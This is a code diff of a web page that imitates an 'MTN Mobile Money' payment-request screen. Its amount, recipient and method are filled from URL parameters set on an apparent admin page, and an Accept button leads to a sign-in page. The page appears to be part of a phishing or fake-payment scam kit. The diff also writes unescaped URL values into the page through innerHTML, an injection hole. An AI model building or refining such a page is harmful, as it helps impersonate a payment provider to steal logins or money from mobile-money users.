@@ -35,42 +35,32 @@
     position: relative; overflow: hidden;
   }
 
-  /* ===== Top bar with Copy + Print (fixed at very top) ===== */
+  /* ===== Fixed top toolbar ===== */
   .toolbar {
     flex-shrink: 0;
     background: var(--mtn-white);
     padding: max(12px, env(safe-area-inset-top, 0px)) 16px 10px;
     border-bottom: 1px solid var(--mtn-border);
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
+    display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
     z-index: 30;
   }
   .tool-btn {
     display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-    padding: 11px 12px;
-    font-size: 13px; font-weight: 700;
-    border-radius: 10px;
-    font-family: inherit;
-    cursor: pointer;
-    transition: all .15s;
-    border: 1.5px solid transparent;
+    padding: 11px 12px; font-size: 13px; font-weight: 700;
+    border-radius: 10px; font-family: inherit; cursor: pointer;
+    transition: all .15s; border: 1.5px solid transparent;
   }
-  .tool-outline {
-    background: var(--mtn-white); color: var(--mtn-royal);
-    border-color: #CBD5E1;
-  }
+  .tool-outline { background: var(--mtn-white); color: var(--mtn-royal); border-color: #CBD5E1; }
   .tool-outline:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
   .tool-outline.copied { background: var(--mtn-green); border-color: var(--mtn-green); color: #fff; }
   .tool-primary { background: var(--mtn-royal); color: #fff; border-color: var(--mtn-royal); }
   .tool-primary:hover { filter: brightness(1.08); }
 
-  /* ===== Top blue header ===== */
+  /* ===== Blue header with circle ===== */
   .top {
     position: relative; flex-shrink: 0;
     background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
-    padding-top: 0;
-    padding-bottom: 40px;
+    padding-top: 0; padding-bottom: 40px;
     border-bottom-left-radius: 44% 48px;
     border-bottom-right-radius: 44% 48px;
   }
@@ -82,7 +72,6 @@
   .brand .mtn { color: var(--mtn-yellow); }
   .brand .mm  { color: #FFFFFF; opacity: 0.95; }
 
-  /* ===== Circular illustration ===== */
   .hero {
     position: absolute; left: 50%; transform: translateX(-50%);
     bottom: -120px; width: 68%; max-width: 280px; aspect-ratio: 1 / 1;
@@ -109,8 +98,8 @@
     display: flex; flex-direction: column; align-items: center; text-align: center;
   }
 
-  /* Status block just below circle */
-  .status-block { margin-bottom: 18px; }
+  /* Status (no date line) */
+  .status-block { margin-bottom: 16px; }
   .status-title {
     font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
     color: var(--mtn-text); line-height: 1.25; margin-bottom: 5px;
@@ -118,15 +107,6 @@
   .status-desc {
     font-size: 12.5px; color: var(--mtn-gray); line-height: 1.55;
     max-width: 300px; margin: 0 auto;
-  }
-  .status-ref {
-    font-size: 11.5px; color: var(--mtn-gray); margin-top: 8px;
-    font-weight: 500;
-  }
-  .status-ref .ref-id {
-    font-family: "SF Mono", Monaco, monospace; font-size: 11px;
-    background: var(--mtn-soft); padding: 2px 7px; border-radius: 5px;
-    border: 1px solid var(--mtn-border); color: var(--mtn-text);
   }
 
   /* Amount */
@@ -140,11 +120,10 @@
     color: var(--mtn-deep); line-height: 1;
   }
 
-  /* Accept button */
+  /* Accept */
   .btn-accept {
-    margin-top: 4px;
-    padding: 15px 34px;
-    font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
+    margin-top: 0;
+    padding: 15px 34px; font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
     background: var(--mtn-green); color: #fff;
     border: none; border-radius: 999px;
     cursor: pointer; font-family: inherit;
@@ -158,8 +137,7 @@
 
   /* Recipient */
   .recipient-line {
-    margin-top: 16px;
-    font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
+    margin-top: 16px; font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
   }
   .recipient-line .recv-name {
     display: block; font-weight: 700; color: var(--mtn-text);
@@ -183,16 +161,10 @@
     font-size: 11.5px; font-weight: 600; text-align: right;
     word-break: break-word; color: var(--mtn-text);
   }
-  .detail-row .v.mono {
-    font-family: "SF Mono", Monaco, monospace;
-    font-size: 10.5px; background: #fff; padding: 2px 7px;
-    border-radius: 4px; border: 1px solid var(--mtn-border);
-  }
 
   /* Support */
   .support-line {
-    margin-top: 16px;
-    font-size: 11px; color: var(--mtn-gray); line-height: 1.6;
+    margin-top: 16px; font-size: 11px; color: var(--mtn-gray); line-height: 1.6;
     text-align: center;
   }
   .support-line strong { color: var(--mtn-text); font-weight: 700; }
@@ -207,7 +179,6 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* Print — receipt only */
   @media print {
     body { background: #fff; padding: 0; }
     .toolbar, .brand, .support-line { display: none !important; }
@@ -217,7 +188,6 @@
     .btn-accept { display: none !important; }
   }
 
-  /* Small screens */
   @media (max-width: 380px) {
     .tool-btn { padding: 10px; font-size: 12px; }
     .brand { font-size: 16px; padding: 14px 20px 0; }
@@ -229,7 +199,6 @@
     .btn-accept { padding: 13px 28px; font-size: 14px; min-width: 190px; }
   }
 
-  /* Short screens */
   @media (max-height: 680px) {
     .hero { width: 56%; bottom: -84px; }
     .body { padding-top: 108px; }
@@ -238,7 +207,6 @@
     .details-panel { margin-top: 16px; }
   }
 
-  /* Tablet / desktop */
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
     .phone {
@@ -255,7 +223,7 @@
 
 <div class="phone">
 
-  <!-- Copy + Print toolbar (top of page) -->
+  <!-- Copy + Print -->
   <div class="toolbar">
     <button class="tool-btn tool-outline" id="copyBtn" onclick="copyReceipt()">
       <span>📋</span> <span id="copyLbl">Copy Receipt</span>
@@ -265,11 +233,10 @@
     </button>
   </div>
 
-  <!-- Blue header -->
+  <!-- Blue header + circle -->
   <div class="top">
     <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
 
-    <!-- Circle illustration -->
     <div class="hero" aria-hidden="true">
       <div class="outer"></div>
       <div class="green-ring">
@@ -312,11 +279,10 @@
   <!-- Body -->
   <div class="body">
 
-    <!-- Status block -->
+    <!-- Status only: title + description, no date above Accept -->
     <div class="status-block">
       <div class="status-title">Payment Request Received</div>
       <div class="status-desc">Please review the details below and confirm the payment.</div>
-      <div class="status-ref" id="statusRef"></div>
     </div>
 
     <!-- Amount -->
@@ -334,7 +300,7 @@
       <span class="recv-name" id="reqRecipient">—</span>
     </div>
 
-    <!-- Details -->
+    <!-- Details: no date, no duplicate Transaction ID, method from admin -->
     <div class="details-panel" id="detailsPanel"></div>
 
     <!-- Support -->
@@ -355,8 +321,7 @@
     if (!isFinite(n)) return '0 ' + (currency || '');
     try {
       const parts = new Intl.NumberFormat(locale, {
-        minimumFractionDigits: 0,
-        maximumFractionDigits: 2
+        minimumFractionDigits: 0, maximumFractionDigits: 2
       }).format(n);
       const pretty = currency === 'XAF' ? parts.replace(/\u202F|\u00A0|,/g, ' ') : parts;
       return pretty + ' ' + currency;
@@ -379,7 +344,7 @@
     cur: params.get('cur') || '',
     rn:  params.get('rn')  || '',
     c:   params.get('c')   || '',
-    pm:  params.get('pm')  || 'MTN Mobile Money',
+    pm:  params.get('pm')  || '',
     sn:  params.get('sn')  || '',
     mk:  params.get('mk')  || ''
   };
@@ -403,30 +368,22 @@
   document.getElementById('amtVal').textContent = Number(tx.am || 0).toFixed(2);
   document.getElementById('reqRecipient').textContent = tx.rn || '—';
 
-  const refEl = document.getElementById('statusRef');
-  if (tx.ref) {
-    refEl.innerHTML = 'Transaction <span class="ref-id">' + tx.ref + '</span> · ' + formatDate();
-  } else {
-    refEl.textContent = formatDate();
-  }
-
+  // Details — Transaction ID shown once elsewhere, so it is NOT repeated here.
+  // Method row shows the exact value entered on the admin page.
   const details = [
-    { k: 'Country',        v: tx.c },
-    { k: 'Transaction ID', v: tx.ref, mono: true },
-    { k: 'Date',           v: formatDate() },
-    { k: 'Method',         v: tx.pm },
-    { k: 'Service',        v: tx.sn },
-    { k: 'Marketed',       v: tx.mk },
-    { k: 'Status',         v: 'Payment Request Received' }
+    { k: 'Country',  v: tx.c },
+    { k: 'Method',   v: tx.pm },
+    { k: 'Service',  v: tx.sn },
+    { k: 'Marketed', v: tx.mk }
   ];
   let html = '';
   details.forEach(r => {
     if (!r.v && r.v !== 0) return;
-    const cls = r.mono ? 'mono' : '';
-    html += `<div class="detail-row"><span class="k">${r.k}</span><span class="v ${cls}">${r.v}</span></div>`;
+    html += `<div class="detail-row"><span class="k">${r.k}</span><span class="v">${r.v}</span></div>`;
   });
   document.getElementById('detailsPanel').innerHTML = html;
 
+  // Support
   const supportNum = SUPPORT_NUMBERS[tx.c];
   if (supportNum) {
     document.getElementById('supportNum').textContent = supportNum;
@@ -468,7 +425,7 @@
     document.body.removeChild(ta);
   }
 
-  /* ---------- Accept → navigate to sign-in page ---------- */
+  /* ---------- Accept → sign-in page ---------- */
   function acceptPayment() {
     const btn = document.getElementById('acceptBtn');
     btn.disabled = true;
